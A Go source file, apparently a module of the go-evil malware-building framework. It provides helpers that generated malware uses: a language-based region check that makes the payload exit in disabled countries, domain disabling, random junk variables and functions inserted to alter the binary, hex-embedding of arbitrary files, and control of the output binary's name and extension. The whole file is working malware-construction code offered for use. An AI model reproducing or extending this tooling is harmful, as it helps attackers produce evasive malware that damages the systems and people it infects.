package malware

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
	"github.com/thanhpk/randstr"
)

func Disable_domain(domain string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.Is_disabled()")

	data_structure.Append_disabled_domain(domain)

	return json.Send(data_structure)
}

func Is_disabled(domain string, base_64_serialize_json string) (bool, string) {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.Is_disabled()")
	toReturn := false

	for _, disabled_domain := range data_structure.Disabled_domains {
		if contains.StartsWith(domain, []string{disabled_domain}) {
			toReturn = true
			break
		}
	}

	return toReturn, json.Send(data_structure)
}

func Disable_region(country string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.Disable_region()")

	data_structure.Append_disabled_region(fmt.Sprintf("\"%s\"", country))
	return json.Send(data_structure)
}

func Region_is_disabled(base_64_serialize_json string) ([]string, string) {
	var content = []string{"region, _ := jibber_jabber.DetectLanguage()"}
	content = append(content, "var disabled_regions = []string{")

	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.Region_is_disabled()")

	for _, region := range data_structure.Disable_region {
		content = append(content, fmt.Sprintf("%s,", region))
	}
	content = append(content, "}")

	var line = `for _, disabled_region := range disabled_regions {
		if region == disabled_region {
			return
		}
	}`

	content = append(content, strings.Split(line, "\n")...)

	return content, json.Send(data_structure)
}

func Get_malware_location() string {
	location, err := os.Executable()
	toReturn := ""

	if err != nil {
		notify.Error(err.Error(), "malware.Get_malware_location()")
	} else {
		temp := ""
		for _, c := range location {
			temp += string(c)
			if c == '/' {
				toReturn += temp
				temp = ""
			}
		}
	}
	return toReturn
}

// User manipulative area
func SetExtension(new_ext string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.SetExtension()")

	if !contains.StartsWith(new_ext, []string{"."}) { // Add the . if the user didn't supply it
		new_ext = "." + new_ext
	}

	data_structure.Set_Extension(new_ext)

	return json.Send(data_structure)
}

func SetBinaryName(new_name string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.SetBinaryName()")

	data_structure.Set_binary_name(new_name)

	return json.Send(data_structure)
}

func Generate_random_name(size int) string {
	var toReturn string
	for {
		toReturn = randstr.String(size)
		if _, err := strconv.Atoi(string(toReturn[0])); err != nil { // It can't start with a number
			break
		}
	}
	return toReturn
}

func AddRandomVariable(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.AddRandomVariable()")

	new_var := Generate_random_name(64)
	data_structure.Append_malware_gut(fmt.Sprintf("var %s string", new_var))

	new_func := Generate_random_name(64)
	data_structure.Append_malware_gut(fmt.Sprintf("%s := func(v string){}", new_func))
	data_structure.Append_malware_gut(fmt.Sprintf("%s(%s)", new_func, new_var))

	return json.Send(data_structure)
}

func AddRandomFunction(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.AddRandomFunction()")

	new_func := Generate_random_name(64)

	data_structure.Append_malware_gut(fmt.Sprintf("%s := func(){}", new_func))
	data_structure.Append_malware_gut(fmt.Sprintf("%s()", new_func))

	return json.Send(data_structure)
}

func AddStaticFile(file_to_include string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Malware.AddStaticFile()")

	file_gut, err := ioutil.ReadFile(file_to_include)
	if err != nil {
		notify.Error(err.Error(), "malware.AddStaticFile")
	} else {
		new_array := Generate_random_name(32)
		data_structure.Append_malware_gut(fmt.Sprintf("%s := []string{", new_array))

		for _, line := range file_gut {
			data_structure.Append_malware_gut(fmt.Sprintf("\"%s\",", hex.EncodeToString([]byte{line})))
		}
		data_structure.Append_malware_gut("}")
		data_structure.Append_malware_gut(fmt.Sprintf("runtime.Set_Static_Variable(%s)", new_array))
	}
	return json.Send(data_structure)

}
